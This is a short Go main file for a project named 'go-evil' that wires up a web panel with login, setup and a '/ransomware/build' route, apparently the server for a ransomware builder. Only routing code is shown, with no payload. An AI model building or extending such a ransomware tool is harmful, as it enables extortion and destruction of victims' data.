package main

import (
	settings "go-evil"
	"go-evil/handlers"
	"log"
	"net/http"
)

func init() {

}

//when checking the auth make sure to check the string manually to avoid timming based attacks

func main() {
	http.HandleFunc("/login", handlers.Login)
	http.HandleFunc("/setup", handlers.Setup)

	http.HandleFunc("/", handlers.Panel)

	http.HandleFunc("/ransomware/build", handlers.RansomwareBuilder)

	//serve js and css
	http.Handle("/assets/", http.StripPrefix("/assets/", http.FileServer(http.Dir("../frontend/assets/"))))

	err := http.ListenAndServe(settings.Endpoint, nil)
	if err != nil {
		log.Fatalln(err)
	}
}
